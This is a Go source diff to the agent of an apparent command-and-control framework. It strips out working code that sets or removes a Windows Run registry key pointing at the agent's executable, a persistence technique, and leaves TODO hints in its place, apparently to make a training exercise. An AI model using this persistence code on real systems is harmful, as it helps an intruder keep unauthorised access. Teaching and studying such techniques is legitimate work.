@@ -5,8 +5,6 @@ package agent
 import (
 	"fmt"
 
-	"golang.org/x/sys/windows/registry"
-
 	"c2framework/internals/control"
 	"c2framework/internals/models"
 )
@@ -20,27 +18,28 @@ func doPersist(args control.PersistArgsAgent) models.PersistResult {
 	result := models.PersistResult{}
 
 	// Open the Run key
-	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
+	// TODO: call registry.OpenKey() to open Run Key
 	if err != nil {
 		result.Success = false
 		result.Message = fmt.Sprintf("failed to open registry key: %v", err)
 		return result
 	}
-	defer key.Close()
+	// TODO: defer Close() of key
 
 	if args.Remove {
 		// Remove the registry value
-		err = key.DeleteValue(args.Name)
+		// TODO: remove key using key.DeleteValue()
 		if err != nil {
+			// TODO: set result.Success to false
 			result.Success = false
 			result.Message = fmt.Sprintf("failed to delete registry value: %v", err)
 			return result
 		}
-		result.Success = true
+		// TODO: set result.Success to true
 		result.Message = fmt.Sprintf("Removed registry persistence '%s'", args.Name)
 	} else {
 		// Set the registry value to our executable path
-		err = key.SetStringValue(args.Name, args.AgentPath)
+		// TODO: set run key by calling key.SetStringValue()
 		if err != nil {
 			result.Success = false
 			result.Message = fmt.Sprintf("failed to set registry value: %v", err)
